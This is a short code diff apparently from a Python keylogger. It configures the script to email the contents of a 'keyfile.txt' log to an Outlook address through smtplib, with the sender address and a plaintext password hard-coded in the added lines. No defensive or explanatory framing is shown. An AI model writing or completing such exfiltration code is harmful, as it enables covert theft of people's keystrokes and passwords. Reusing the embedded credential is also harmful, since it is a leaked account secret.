@@ -5,12 +5,13 @@ import smtplib
 import time
 from email.mime.text import MIMEText
 
-EMAIL_ADDRESS =       
-EMAIL_PASSWORD =   
+EMAIL_ADDRESS = "keyloggymckeyloggyface@outlook.com"       
+EMAIL_PASSWORD = "H7dzE6eXTfsfib"
 TO_EMAIL = EMAIL_ADDRESS
 TXT_FILE = "keyfile.txt"                        
-SMTP_SERVER = "smtp.gmail.com"
+SMTP_SERVER = "smtp-mail.outlook.com"
 SMTP_PORT = 587
+
 
 def send_file_contents():
     # Read file contents
@@ -76,6 +77,7 @@ if __name__ == "__main__":
   
 
     
+
 
 
 
